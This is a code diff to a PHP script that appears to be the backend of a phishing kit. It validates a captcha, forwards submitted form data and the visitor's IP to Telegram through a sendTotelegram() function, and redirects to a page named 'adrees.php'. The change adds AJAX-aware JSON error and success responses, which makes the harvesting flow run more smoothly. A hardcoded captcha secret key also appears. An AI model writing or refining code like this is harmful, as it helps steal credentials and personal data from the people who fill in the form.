@@ -21,6 +21,24 @@ function sendTotelegram($data){
 
 }
 
+function isAjaxRequest() {
+    return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
+}
+
+function respondLoginError($message) {
+    if (isAjaxRequest()) {
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => false,
+            'error' => $message
+        ]);
+        exit;
+    }
+
+    echo $message;
+    exit;
+}
+
 
 
 $ip = $_SERVER['REMOTE_ADDR'];
@@ -33,8 +51,7 @@ $captchaResponse = $_POST['h-captcha-response'] ?? '';
 $captchaSecret = "ES_c2e6eff9a7644bae93f860ec1e530f92"; // Replace with your hCaptcha secret key
 
 if (empty($captchaResponse)) {
-    echo "Error: Captcha not completed.";
-    exit;
+    respondLoginError("Error: Captcha not completed.");
 }
 
 // Validate captcha response
@@ -50,8 +67,7 @@ $responseData = json_decode(curl_exec($verifyCaptcha));
 curl_close($verifyCaptcha);
 
 if (!$responseData || !$responseData->success) {
-    echo "Error: Invalid captcha.";
-    exit;
+    respondLoginError("Error: Invalid captcha.");
 }
 
 $msg = "
@@ -64,6 +80,16 @@ IP: $ip
 ";
 
 sendTotelegram($msg);
+
+if (isAjaxRequest()) {
+    header('Content-Type: application/json');
+    echo json_encode([
+        'success' => true,
+        'redirect' => 'adrees.php'
+    ]);
+    exit;
+}
+
 header("location: adrees.php");
 exit;
 
